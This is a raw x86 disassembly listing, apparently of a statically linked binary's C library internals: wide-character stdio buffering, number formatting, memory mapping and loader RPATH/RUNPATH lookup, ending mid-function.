mov eax, dword [var_8h]
mov dword [var_14h], edx
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f210
mov dword [eax], 0x25
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [var_10h]
mov edi, 1
movzx eax, byte [edx + 0xc]
test al, 8
je 0x806eee3
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f1ec
mov dword [eax], 0x23
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [var_10h]
mov edi, 2
movzx eax, byte [edx + 0xc]
test al, 0x80
je 0x806ef0d
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f1cd
mov dword [eax], 0x27
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [var_10h]
inc edi
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x806f1a2
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f183
mov dword [eax], 0x2b
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [var_10h]
inc edi
movzx eax, byte [edx + 0xc]
test al, 0x20
je 0x806ef5e
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f164
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc edi
mov eax, dword [var_10h]
cmp dword [eax + 0x10], 0x30
je 0x806f129
mov eax, dword [var_10h]
test byte [eax + 0xd], 8
je 0x806ef93
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f10d
mov dword [eax], 0x49
add eax, 4
mov dword [edx + 0x10], eax
inc edi
mov edx, dword [var_10h]
mov eax, dword [edx + 4]
test eax, eax
je 0x806f000
mov ecx, eax
mov ebx, dword [var_14h]
mov esi, 0xcccccccd
mov eax, ecx
sub ebx, 4
mul esi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
mov eax, dword [ecx*4 + str.0123456789abcdefghijklmnopqrstuvwxyz]
mov ecx, edx
mov dword [ebx], eax
jne 0x806efa7
cmp ebx, dword [var_14h]
jae 0x806f000
lea esi, [esi]
mov eax, dword [var_8h]
mov ecx, dword [ebx]
add ebx, 4
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f0f8
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806f0ad
inc edi
cmp ebx, dword [var_14h]
jb 0x806efd0
lea esi, [esi]
mov eax, dword [var_10h]
mov edx, dword [eax]
cmp edx, 0xffffffff
je 0x806f07c
mov eax, dword [var_8h]
mov ecx, dword [eax + 0x58]
mov eax, dword [ecx + 0x10]
cmp eax, dword [ecx + 0x14]
jae 0x806f0d8
mov dword [eax], 0x2e
add eax, 4
mov dword [ecx + 0x10], eax
inc edi
mov ecx, edx
mov ebx, dword [var_14h]
mov esi, 0xcccccccd
mov eax, ecx
sub ebx, 4
mul esi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
mov eax, dword [ecx*4 + str.0123456789abcdefghijklmnopqrstuvwxyz]
mov ecx, edx
mov dword [ebx], eax
jne 0x806f033
cmp ebx, dword [var_14h]
jae 0x806f07c
mov eax, dword [var_8h]
mov ecx, dword [ebx]
add ebx, 4
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f0c6
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806f0ad
inc edi
cmp ebx, dword [var_14h]
jb 0x806f058
mov eax, dword [var_10h]
mov ecx, dword [eax + 8]
test ecx, ecx
je 0x806f0a0
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f0b4
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806f0ad
inc edi
mov eax, edi
mov esp, dword [var_10h_2]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov edi, 0xffffffff
jmp 0x806f0a0
mov dword [var_4h], ecx
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806f09d
mov dword [var_4h], ecx
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806f074
mov dword [var_4h], 0x2e
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
je 0x806f0ad
mov eax, dword [var_10h]
mov edx, dword [eax]
jmp 0x806f028
mov dword [var_4h], ecx
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806eff0
mov dword [var_4h], 0x49
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806ef92
jmp 0x806f0ad
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f149
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
inc edi
jmp 0x806ef6b
mov dword [var_4h], 0x30
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806f143
jmp 0x806f0ad
mov dword [var_4h], 0x2d
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806ef5d
jmp 0x806f0ad
mov dword [var_4h], 0x2b
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806ef33
jmp 0x806f0ad
test al, 0x10
je 0x806ef3b
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f1c3
mov dword [eax], 0x20
jmp 0x806ef2d
mov dword [var_4h], 0x20
jmp 0x806f18b
mov dword [var_4h], 0x27
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806ef05
jmp 0x806f0ad
mov dword [var_4h], 0x23
mov edi, 0xffffffff
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806eed7
jmp 0x806f0a0
mov dword [var_4h], 0x25
mov edi, 0xffffffff
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806eea9
jmp 0x806f0a0
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
mov ecx, dword [esi + 0x58]
mov edi, dword [esi + 0x154]
mov eax, dword [ecx + 0x10]
sub eax, dword [ecx + 0xc]
sar eax, 2
jne 0x806f344
mov eax, dword [ecx + 0x10]
cmp eax, dword [ecx + 0x14]
jae 0x806f336
mov dword [eax], ebx
add eax, 4
mov dword [ecx + 0x10], eax
mov eax, ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.08075d10
jmp 0x806f32b
mov edx, dword [edi + 0x94]
mov dword [var_sp_8h], eax
mov eax, dword [ecx + 0xc]
mov dword [esp], edi
mov dword [var_sp_4h], eax
call dword [edx + 0x1c]
mov ecx, dword [esi + 0x58]
shl eax, 2
sub dword [ecx + 0x10], eax
jmp 0x806f319
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x78
mov esi, dword [arg_8h]
mov edx, dword [esi + 0x1c]
test edx, edx
je 0x8075340
mov eax, dword [esi + 0x38]
test eax, eax
js 0x807532e
mov eax, dword [esi + 0x94]
lea edx, [var_6ch]
mov dword [esp], esi
mov dword [var_4h], edx
call dword [eax + 0x48]
test eax, eax
js 0x807532e
mov eax, dword [var_5ch]
mov edx, 0x2000
and eax, 0xf000
cmp eax, 0x2000
sete al
movzx edi, al
mov eax, dword [var_38h]
test eax, eax
cmovg edx, eax
lea ebx, [edx*4]
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
lea eax, [ebx + 0xfff]
mov dword [var_ch], 0x22
mov dword [var_8h], 3
and eax, 0xfffff000
mov dword [esp], 0
mov dword [var_4h], eax
call fcn.080546d0
mov edx, eax
mov eax, 0xffffffff
cmp edx, 0xffffffff
je 0x807530f
lea eax, [ebx + edx]
mov dword [var_ch], 1
mov dword [var_4h], edx
mov dword [var_8h], eax
mov dword [esp], esi
call fcn.08075a60
test edi, edi
jne 0x8075317
mov eax, 1
add esp, 0x78
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi + 0x38]
mov dword [esp], eax
call fcn.08079ee0
test eax, eax
je 0x807530a
or dword [esi], 0x200
jmp 0x807530a
xor edi, edi
mov edx, 0x2000
jmp 0x807529d
lea esi, [esi]
mov dword [esp], esi
call fcn.08074f80
jmp 0x8075257
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edi, dword [arg_8h]
mov ecx, dword [edi + 0x58]
mov eax, dword [ecx + 8]
mov ebx, ecx
cmp dword [ecx], eax
jbe 0x8075c18
mov edx, dword [edi]
test dh, 1
jne 0x8075b13
mov esi, dword [edi + 4]
movsx eax, byte [esi - 1]
cmp eax, dword [arg_ch]
je 0x8075c0d
and dh, 1
jne 0x8075b98
mov edx, dword [ebx]
cmp edx, dword [ebx + 8]
jbe 0x8075b8f
mov ecx, dword [ebx + 0x20]
test ecx, ecx
jne 0x8075b7a
mov dword [esp], 0x200
call fcn.08050fe0
mov edx, 0xffffffff
test eax, eax
je 0x8075b70
mov ecx, dword [edi + 0x58]
mov dword [ecx + 0x20], eax
add eax, 0x200
mov dword [ecx + 0x28], eax
mov dword [ecx + 0x24], eax
mov eax, dword [ecx]
mov dword [ecx + 8], eax
mov dword [esp], edi
call fcn.08075a30
mov ecx, dword [edi + 0x58]
mov edx, dword [ecx]
lea eax, [edx - 4]
mov dword [ecx], eax
mov eax, dword [arg_ch]
mov dword [edx - 4], eax
mov edx, dword [arg_ch]
add esp, 0x14
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, edi
call fcn.08076220
mov edx, 0xffffffff
test eax, eax
jne 0x8075b70
mov ecx, dword [edi + 0x58]
jmp 0x8075b50
mov edx, dword [ebx + 0x20]
test edx, edx
jne 0x8075b50
jmp 0x8075b2a
mov eax, dword [ebx + 8]
cmp dword [ebx], eax
ja 0x8075b60
mov esi, dword [ebx + 4]
sub esi, eax
sar esi, 2
lea eax, [esi*8]
lea ebx, [esi + esi]
mov dword [var_14h], eax
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_10h], eax
mov edx, 0xffffffff
je 0x8075b70
mov dword [var_8h], esi
sub ebx, esi
mov eax, dword [edi + 0x58]
mov eax, dword [eax + 8]
mov dword [var_4h], eax
mov eax, dword [var_10h]
lea ebx, [eax + ebx*4]
mov dword [esp], ebx
call fcn.080776d0
mov eax, dword [edi + 0x58]
mov eax, dword [eax + 8]
mov dword [esp], eax
call fcn.08051180
mov ecx, dword [edi + 0x58]
mov eax, dword [var_10h]
mov dword [ecx + 8], eax
mov dword [ecx], ebx
mov dword [ecx + 0x24], ebx
add eax, dword [var_14h]
mov dword [ecx + 4], eax
jmp 0x8075b60
lea eax, [esi - 1]
mov dword [edi + 4], eax
jmp 0x8075b6d
mov edx, dword [edi]
jmp 0x8075b13
push ebp
mov ebp, esp
push ebx
sub esp, 8
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov ecx, dword [edx + 0x18]
test ecx, ecx
je 0x8075c39
test byte [ebx], 1
je 0x8075c91
mov eax, dword [ebx + 0x30]
test eax, eax
je 0x8075c4d
mov dword [eax + 4], 0
mov eax, dword [eax]
test eax, eax
jne 0x8075c40
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x8075c7d
mov edx, dword [ebx + 0x48]
test edx, edx
je 0x8075c70
mov eax, 0
test eax, eax
je 0x8075c70
mov dword [esp], edx
call section.
lea esi, [esi]
mov dword [arg_8h], ebx
add esp, 8
pop ebx
leave
jmp fcn.0804d500
mov eax, dword [edx + 0x20]
mov dword [esp], eax
call fcn.08051180
mov dword [ebx + 0x24], 0
jmp 0x8075c54
mov eax, dword [edx + 0x1c]
sub eax, ecx
add eax, 0xfff
and eax, 0xfffff000
mov dword [var_4h], eax
mov eax, dword [edx + 0x18]
mov dword [esp], eax
call fcn.08054780
mov edx, dword [ebx + 0x58]
mov dword [edx + 0x1c], 0
mov dword [edx + 0x18], 0
jmp 0x8075c39
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, 0xffffffff
inc eax
je 0x8075cfe
mov eax, dword [ebx + 0x58]
mov edx, dword [eax]
mov ecx, dword [edx]
add edx, 4
mov dword [eax], edx
mov edx, ecx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp dword [ebx + 0x5c], 0
jl 0x8075e16
je 0x8075e03
test byte [ebx + 1], 8
jne 0x8075df1
mov ecx, dword [ebx + 0x58]
mov eax, dword [ecx]
cmp eax, dword [ecx + 4]
jb 0x8075de8
test byte [ebx + 1], 1
jne 0x8075dd6
mov eax, dword [ebx + 0x30]
test eax, eax
jne 0x8075dc1
mov eax, dword [ecx + 0x20]
test eax, eax
jne 0x8075db7
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x14]
mov edx, eax
mov esi, esi
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [esp], ebx
call fcn.080761d0
jmp 0x8075da0
mov edx, dword [ecx + 4]
mov eax, ebx
call fcn.08076220
mov edx, 0xffffffff
test eax, eax
je 0x8075da0
jmp 0x8075db0
mov dword [esp], ebx
call fcn.08075a00
mov ecx, dword [ebx + 0x58]
mov eax, dword [ecx]
cmp eax, dword [ecx + 4]
jae 0x8075d92
mov edx, dword [eax]
add eax, 4
mov dword [ecx], eax
jmp 0x8075db0
mov dword [esp], ebx
call fcn.08076150
mov edx, 0xffffffff
inc eax
jne 0x8075d82
jmp 0x8075db0
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
dec eax
je 0x8075e1d
mov edx, 0xffffffff
jmp 0x8075db0
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x8075d7c
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
jmp 0x8075d7c
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov esi, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [var_10h], eax
mov eax, dword [arg_8h]
mov edi, dword [eax + 0x58]
mov ebx, dword [edi + 4]
mov eax, dword [edi]
sub ebx, eax
sar ebx, 2
test ebx, ebx
jle 0x8076022
cmp ebx, dword [var_10h]
cmova ebx, dword [var_10h]
cmp ebx, 0x14
jg 0x807604c
test ebx, ebx
jle 0x8076048
mov edx, ebx
mov ecx, eax
dec edx
js 0x807601d
lea esi, [esi]
mov eax, dword [ecx]
add ecx, 4
mov dword [esi], eax
add esi, 4
dec edx
jns 0x8076010
mov dword [edi], ecx
sub dword [var_10h], ebx
mov eax, dword [var_10h]
test eax, eax
je 0x8076037
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075e40
inc eax
jne 0x8075fe2
mov eax, dword [var_10h]
sub dword [arg_10h], eax
mov eax, dword [arg_10h]
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
xor ebx, ebx
jmp 0x807601f
mov dword [var_8h], ebx
mov eax, dword [edi]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.080539d0
mov esi, eax
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
lea eax, [ebx*4]
add dword [edx], eax
jmp 0x807601f
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
mov dword [var_ch], 0x22
mov dword [var_8h], 3
mov dword [var_4h], 0x2000
mov dword [esp], 0
call fcn.080546d0
mov edx, eax
mov eax, 0xffffffff
cmp edx, 0xffffffff
je 0x807614c
lea eax, [edx + 0x8000]
mov dword [var_ch], 1
mov dword [var_4h], edx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075a60
mov eax, 1
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
cmp eax, dword [edx + 8]
jbe 0x80763ee
cmp dword [eax - 4], ecx
je 0x807640b
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_sp_4h], ecx
call dword [eax + 0x18]
cmp eax, 0xffffffff
je 0x8076406
and dword [ebx], 0xffffffef
mov ebx, dword [var_4h]
leave
ret
sub eax, 4
mov dword [edx], eax
mov eax, ecx
jmp 0x80763fe
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov ecx, dword [edx]
cmp ecx, dword [edx + 8]
jbe 0x807644b
lea eax, [ecx - 4]
mov dword [edx], eax
mov eax, dword [ecx - 4]
cmp eax, 0xffffffff
je 0x8076446
and dword [ebx], 0xffffffef
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_sp_4h], 0xffffffff
call dword [eax + 0x18]
jmp 0x807643e
push ebp
mov ebp, esp
push ebx
mov ecx, dword [arg_ch]
mov ebx, dword [arg_10h]
lea edx, [ecx + ebx*4]
cmp edx, ecx
jbe 0x807648f
mov eax, edx
sub edx, 4
cmp dword [edx], 0xa
je 0x8076499
cmp edx, ecx
ja 0x8076483
mov eax, dword [arg_8h]
add eax, ebx
mov ebx, dword [esp]
leave
ret
sub eax, edx
sar eax, 2
dec eax
jmp 0x8076494
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov eax, dword [ebx]
mov dword [esi + 4], ebx
test ah, 8
jne 0x8076500
test ah, 1
je 0x80764ef
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
sub eax, dword [edx + 4]
sar eax, 2
mov dword [esi + 8], eax
mov eax, dword [ebx + 0x30]
mov dword [esi], eax
mov dword [ebx + 0x30], esi
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
sub eax, dword [edx + 8]
jmp 0x80764d9
lea esi, [esi]
mov dword [esp], ebx
call fcn.08076150
mov eax, dword [ebx]
jmp 0x80764cc
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_ch]
mov ebx, dword [esi + 4]
cmp ebx, dword [arg_8h]
jne 0x80765b1
mov ecx, dword [esi + 8]
test ecx, ecx
js 0x8076596
test byte [ebx + 1], 1
jne 0x8076589
mov eax, dword [ebx + 0x58]
mov edx, dword [eax + 8]
lea edx, [edx + ecx*4]
mov dword [eax], edx
xor eax, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08075a00
mov ecx, dword [esi + 8]
jmp 0x8076574
test byte [ebx + 1], 1
je 0x80765a4
mov eax, dword [ebx + 0x58]
mov edx, dword [eax + 4]
jmp 0x807657a
mov dword [esp], ebx
call fcn.08075a30
mov ecx, dword [esi + 8]
jmp 0x807659c
mov eax, 0xffffffff
jmp 0x8076581
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x30]
test edx, edx
je 0x80765d4
mov dword [eax + 0x30], 0
mov ecx, dword [eax + 0x24]
test ecx, ecx
jne 0x80765dd
leave
ret
mov dword [arg_8h], eax
leave
jmp fcn.080761d0
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov ebx, dword [arg_8h]
mov esi, dword [ebx + 0x50]
mov dword [var_10h], eax
mov eax, dword [arg_1ch]
mov dword [ebx + 0x54], eax
mov eax, dword [arg_20h]
mov dword [ebx + 0x58], eax
mov eax, dword [arg_ch]
mov dword [ebx + 0x68], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_ch]
mov dword [var_1ch], 0
mov dword [var_18h], 0
mov dword [var_14h], eax
mov dword [var_sp_10h], 0
mov dword [esp], esi
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
lea eax, [var_10h]
mov dword [var_8h], eax
lea eax, [ebx + 0x54]
mov dword [var_4h], eax
call dword [esi + 0x14]
mov edx, dword [var_10h]
mov ecx, eax
mov eax, dword [arg_18h]
cmp ecx, 4
mov dword [eax], edx
mov eax, dword [arg_24h]
mov edx, dword [ebx + 0x54]
mov dword [eax], edx
je 0x8076844
jg 0x8076848
test ecx, ecx
je 0x8076844
mov eax, 2
add esp, 0x28
pop ebx
pop esi
leave
ret
xor eax, eax
jmp 0x807683d
cmp ecx, 5
je 0x8076852
cmp ecx, 7
jne 0x8076838
mov eax, 1
jmp 0x807683d
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x24
mov eax, dword [arg_10h]
mov ebx, dword [arg_8h]
mov dword [ebx + 0x54], eax
mov esi, dword [ebx + 0x50]
mov eax, dword [arg_14h]
mov dword [ebx + 0x58], eax
mov eax, dword [arg_ch]
mov dword [ebx + 0x68], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_ch]
mov dword [var_1ch], 0
mov dword [var_18h], 1
mov dword [var_14h], eax
mov dword [var_10h], 0
mov dword [var_sp_ch], 0
lea eax, [ebx + 0x54]
mov dword [var_8h], 0
mov dword [esp], esi
mov dword [var_4h], eax
call dword [esi + 0x14]
mov edx, dword [ebx + 0x54]
mov ecx, eax
mov eax, dword [arg_18h]
cmp ecx, 4
mov dword [eax], edx
je 0x80768e8
jg 0x80768ec
test ecx, ecx
je 0x80768e8
mov eax, 2
add esp, 0x24
pop ebx
pop esi
leave
ret
xor eax, eax
jmp 0x80768e1
cmp ecx, 5
je 0x80768f6
cmp ecx, 7
jne 0x80768dc
mov eax, 1
jmp 0x80768e1
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov ebx, dword [arg_8h]
mov esi, dword [ebx + 0x24]
mov dword [var_10h], eax
mov eax, dword [arg_1ch]
mov dword [ebx + 0x28], eax
mov eax, dword [arg_20h]
mov dword [ebx + 0x2c], eax
mov eax, dword [arg_ch]
mov dword [ebx + 0x3c], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_ch]
mov dword [var_1ch], 0
mov dword [var_18h], 0
mov dword [var_14h], eax
mov dword [var_sp_10h], 0
mov dword [esp], esi
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
lea eax, [var_10h]
mov dword [var_8h], eax
lea eax, [ebx + 0x28]
mov dword [var_4h], eax
call dword [esi + 0x14]
mov edx, dword [var_10h]
mov ecx, eax
mov eax, dword [arg_18h]
cmp ecx, 4
mov dword [eax], edx
mov eax, dword [arg_24h]
mov edx, dword [ebx + 0x28]
mov dword [eax], edx
je 0x8076994
jg 0x8076998
test ecx, ecx
je 0x8076994
mov eax, 2
add esp, 0x28
pop ebx
pop esi
leave
ret
xor eax, eax
jmp 0x807698d
cmp ecx, 5
je 0x80769a2
cmp ecx, 7
jne 0x8076988
mov eax, 1
jmp 0x807698d
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x24]
mov eax, 0xffffffff
mov ecx, dword [edx + 0x34]
test ecx, ecx
jne 0x80769ce
mov eax, dword [edx + 0x24]
cmp eax, dword [edx + 0x28]
cmovne eax, ecx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov edx, dword [arg_18h]
mov ebx, dword [arg_8h]
mov edi, esp
mov dword [var_14h], eax
lea eax, [edx*4 + 0x10]
sub esp, eax
mov esi, dword [ebx + 0x24]
lea eax, [var_2fh]
and eax, 0xfffffff0
mov dword [ebx + 0x28], eax
lea edx, [eax + edx*4]
mov eax, dword [arg_ch]
mov dword [ebx + 0x2c], edx
mov dword [ebx + 0x3c], eax
add ebx, 0x28
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_10h]
mov dword [var_1ch], 0
mov dword [var_18h], 0
mov dword [var_sp_14h], eax
mov dword [var_sp_10h], 0
mov eax, dword [arg_14h]
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_ch], eax
lea eax, [var_14h]
mov dword [var_8h], eax
call dword [esi + 0x14]
mov eax, dword [var_14h]
sub eax, dword [arg_10h]
mov esp, edi
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x24]
mov eax, dword [eax + 0x28]
leave
ret
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x20
test cl, cl
mov byte [var_15h], cl
mov dword [var_1ch], edx
je 0x807d722
mov dword [edx + 4], 0
mov dword [edx], 0
mov eax, dword [edx + 4]
mov dword [var_10h], 0
lea eax, [edx + eax*8 + 8]
mov dword [var_14h], eax
mov eax, dword [edi + 0x8c]
test eax, eax
jne 0x807d7c0
mov ebx, edi
lea esi, [ebx + 0x180]
mov dword [var_sp_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.0807b6a0
test al, al
jne 0x807d868
mov ebx, dword [ebx + 0x160]
test ebx, ebx
jne 0x807d743
mov ebx, dword [0x80aac58]
test ebx, ebx
je 0x807d7c0
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
je 0x807d7c0
cmp ebx, edi
je 0x807d7c0
lea esi, [ebx + 0x180]
mov dword [var_sp_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.0807b6a0
test al, al
jne 0x807d850
lea esi, [esi]
lea ecx, [var_ch]
lea ebx, [edi + 0x1d0]
mov dword [var_4h], 0
mov dword [esp], 0x80aa9e0
call fcn.0807d670
mov dword [var_sp_ch], str.RUNPATH
mov dword [var_8h], 0x1d
mov dword [var_4h], ebx
mov dword [esp], edi
call fcn.0807b6a0
test al, al
jne 0x807d83b
test byte [edi + 0x1ed], 8
je 0x807d822
cmp byte [var_15h], 0
je 0x807d81a
mov eax, dword [var_1ch]
mov ecx, dword [eax]
mov edx, dword [eax + 4]
lea edx, [ecx + edx*8 + 8]
mov dword [eax], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], 0x80aa9f4
call fcn.0807d670
jmp 0x807d806
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], ebx
call fcn.0807d670
jmp 0x807d7fd
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.0807d670
jmp 0x807d7c0
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.0807d670
jmp 0x807d76d
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_14h], edx
mov dword [var_18h], ecx
mov dword [var_10h], eax
call dword [0x80a9c20]
mov edi, dword [0x80aaa0c]
mov esi, dword [eax]
mov ebx, eax
mov dword [eax], 0
mov eax, dword [var_10h]
mov dword [0x80aaa0c], eax
mov eax, dword [var_18h]
mov dword [esp], eax
call dword [var_14h]
mov dword [ebx], esi
mov dword [0x80aaa0c], edi
mov esi, dword [var_8h]
mov ebx, dword [var_ch]
mov edi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28c
mov esi, dword [0x80aac60]
mov dword [var_250h], 0
mov dword [var_240h], 0xffffffff
mov dword [var_244h], 0
movzx eax, word [esi + 0x14c]
mov ecx, dword [esi + 0x144]
shl eax, 5
lea eax, [eax + ecx]
cmp ecx, eax
jae 0x8082530
mov edx, dword [0x80aac74]
mov ebx, eax
mov dword [var_258h], edx
neg edx
mov dword [var_274h], edx
lea esi, [esi]
cmp dword [ecx], 1
je 0x8082bc0
add ecx, 0x20
cmp ecx, ebx
jb 0x8082520
mov edx, dword [esi]
mov eax, dword [var_240h]
mov dword [0x80aaa14], 0
mov ecx, dword [var_244h]
mov dword [0x80aaa38], 4
add eax, edx
lea edx, [edx + ecx + 3]
and eax, 0xfffffffc
and edx, 0xfffffffc
mov dword [0x80aaa30], eax
mov esi, edx
mov dword [var_25ch], edx
sub esi, eax
mov eax, 0x51eb851f
lea edx, [esi + esi*2]
mov edi, esi
mov dword [0x80aaa34], esi
mul edx
shr edi, 1
mov eax, 0x32
mov dword [var_24ch], edi
shr edx, 5
cmp edx, 0x31
cmova eax, edx
cmp eax, 0x100000
mov dword [0x80aaa28], eax
mov edx, eax
jbe 0x80825b2
